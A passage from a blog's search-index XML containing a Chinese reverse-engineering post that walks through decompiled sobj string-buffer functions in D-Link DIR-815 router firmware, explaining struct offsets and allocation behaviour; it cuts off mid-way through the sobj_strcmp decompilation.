<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>D-Link中sobj类函数逆向分析</title>
    <url>/2020/05/19/d-linkzhong-sobj-lei-han-shu-ni-xiang-fen-xi/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前调试漏洞的时候都是直接根据官方公告或者别人的帖子直接定位漏洞函数，没有具体分析程序中涉及到的其他也挺重要的函数，这样看起来速度挺快，其实之后还会遇到这些函数，所以还是要仔细分析这些函数。</p>
<p>这次选择了D-Link路由器中的sobj类函数：sobj_new()、sobj_add_char()、sobj_strcmp()、sobj_add_string()、sobj_get_string()等进行分析。</p>
<p>这次分析选择D-Link DIR815固件文件系统中的<code>./htdocs/cgibin</code>，利用qemu的用户模式和IDA\gdb-multiarch联调一步步分析汇编源码，同时结合ghidra反汇编的伪C代码分析。</p>
<p>固件版本：DIR-815 FW 1.01b14_1.01b14.bin</p>
<h1 id="sobj类函数"><a href="#sobj类函数" class="headerlink" title="sobj类函数"></a>sobj类函数</h1><h2 id="sobj-new"><a href="#sobj-new" class="headerlink" title="sobj_new()"></a>sobj_new()</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sobj_new</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>malloc_addr<span class="token punctuation">;</span>

  malloc_addr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>pvVar1 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span>malloc_addr <span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>heap<span class="token operator">=</span>malloc_addr <span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>gdb-multiarch联调发现执行完sobj_new之后返回值放在v0中。v0 = 0x42e048</p>
<p><img src="F:%5Cmyblog%5Csource_posts%5CD-Link%C2%96%E4%B8%ADsobj%E7%B1%BB%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%5Csobj_new().png" alt=""></p>
<p>根据sobj_new函数来看出申请了0x18字节的堆空间作为结构体空间，其偏移0x0,0x4处存放对应分配的首地址。 （根据后续的分析得知：0x14处存放的是<strong>malloc/realloc返回的地址也就是申请存放字符串的堆栈空间</strong>，0x10处存放<strong>当前使用的字节数即进行拷贝过的字节数</strong>，0xc处存放*<em>当前申请的总长度减去1字节(减去的一字节代表空字节) *</em> ）</p>
<h2 id="FUN-0040e864"><a href="#FUN-0040e864" class="headerlink" title="FUN_0040e864()"></a>FUN_0040e864()</h2><p>该函数在sobj_add_char()和sobj_add_string()中有调用，参数是sobj_new()申请的结构体地址。</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">FUN_0040e864</span><span class="token punctuation">(</span><span class="token keyword">int</span> malloc_addr<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>pvVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>malloc_addr <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果0x14处为0</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>
      pvVar1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">=</span> pvVar1<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
      iVar2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> iVar2 <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">;</span>
      pvVar1 <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">,</span>iVar2 <span class="token operator">+</span> <span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//最后一个为空字节NULL</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">=</span> pvVar1<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//还要判断上面realloc的返回地址是否为0</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>该函数的作用就是在sobj_new()申请的结构体0x14处malloc/remalloc一个0x21的堆空间，然后将0xc处内容加上0x20。</p>
<h2 id="sobj-add-char-int-malloc-addr-undefined-c"><a href="#sobj-add-char-int-malloc-addr-undefined-c" class="headerlink" title="sobj_add_char(int malloc_addr,undefined c)"></a>sobj_add_char(int malloc_addr,undefined c)</h2><p>该函数的参数有两个：之前sobj_new()申请的结构体首地址malloc_addr，需要add的字符c</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">sobj_add_char</span><span class="token punctuation">(</span><span class="token keyword">int</span> malloc_addr<span class="token punctuation">,</span>undefined c<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  undefined4 uVar2<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span>
     <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token function">FUN_0040e864</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//申请的字节数等于拷贝的字节数并且申请空间失败则退出</span>
  <span class="token punctuation">{</span>
    uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    iVar1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//0x10处加一</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> c<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//申请的堆栈空间加上新的字符串c</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> iVar1<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">+</span> iVar1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    uVar2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> uVar2<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>可以看下运行完一次sobj_add_char之后的结果:</p>
<p><img src="sobj_add_char()1.png" alt=""></p>
<p>运行玩一次之后0x10处为1,0x14处显示的申请的remalloc/malloc的地址，0xc处显示的0x20。</p>
<p><img src="sobj_add_char()2.png" alt=""></p>
<p>并且0x14处的堆地址空间内添加了第一个字符’u’。</p>
<h2 id="sobj-add-string"><a href="#sobj-add-string" class="headerlink" title="sobj_add_string()"></a>sobj_add_string()</h2><p>该函数的参数有两个：目的字符串地址deststr也是sobj_new()申请的结构体地址，需要add的字符串地址sourcestr</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">sobj_add_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> deststr<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>sourcestr<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  size_t len_of_source<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  undefined4 len_of_return<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>deststr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    len_of_return <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    len_of_return <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>sourcestr <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      len_of_source <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>sourcestr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取的第二个参数的长度</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>len_of_source <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        len_of_return <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">do</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//如果需要拷贝的字符串长度小于0xc（总长度）-0x10（已经拷贝过的长度），直接strcpy即可</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>len_of_source <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>uint<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sourcestr<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> len_of_source<span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          iVar1 <span class="token operator">=</span> <span class="token function">FUN_0040e864</span><span class="token punctuation">(</span>deststr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//否则不断申请加0x20直到能够strcpy，每次成功都是返回ivar = 0</span>
          len_of_return <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> iVar1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果上面的FUN_0040e864(deststr)出错ivar=-1</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> len_of_return<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>所以通过继续分析sobj_add_string/sobj_add_char函数得知，其sobj_new返回的结构体中0x10存放<strong>当前使用的字节数即进行拷贝过的字节数</strong>，0xc处存放<strong>当前申请的总长度减去1字节(代表空字节)</strong>，0x14存放<strong>malloc/realloc返回的地址也就是申请存放字符串的堆栈空间</strong>，而且每次会将需求拷贝字符串的长度与总长度减去已用长度得到可用长度进行比较决定是否需要再次申请空间，而strcpy的deststr为malloc/remalloc分配的地址加上已用字节数得到。   </p>
<h2 id="sobj-free-int-param-1"><a href="#sobj-free-int-param-1" class="headerlink" title="sobj_free(int param_1)"></a>sobj_free(int param_1)</h2><p>该函数只有一个参数就是sobj_new()的结构体地址</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">sobj_free</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  undefined4 uVar1<span class="token punctuation">;</span>

  uVar1 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//先看0x14上申请的堆空间是否为空</span>
      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//不为空释放</span>
    <span class="token punctuation">}</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    uVar1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> uVar1<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>没什么好说的释放空间并清0 </p>
<h2 id="sobj-del-void-param-1"><a href="#sobj-del-void-param-1" class="headerlink" title="sobj_del(void *param_1)"></a>sobj_del(void *param_1)</h2><p>该函数只有一个参数就是sobj_new()的结构体地址</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sobj_del</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Could not recover jumptable at 0x0040e77c. Too many branches */</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Treating indirect jump as call */</span>
    <span class="token function">free</span><span class="token punctuation">(</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>清空sobj_new()的0x14处的堆，之后再清空自身。   </p>
<h2 id="sobj-strcmp-string-new-amp-DAT-0041a5d8"><a href="#sobj-strcmp-string-new-amp-DAT-0041a5d8" class="headerlink" title="sobj_strcmp(string_new,&amp;DAT_0041a5d8)"></a>sobj_strcmp(string_new,&amp;DAT_0041a5d8)</h2><p>该函数有两个参数：string_new是sobj_new()的结构体地址，&amp;DAT_0041a5d8是’uid’的地址。Ghidra反汇编结果如下：</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">sobj_strcmp</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  undefined4 uVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    iVar2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      iVar2 <span class="token operator">=</span> <span class="token number">0x419b10</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span>iVar2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
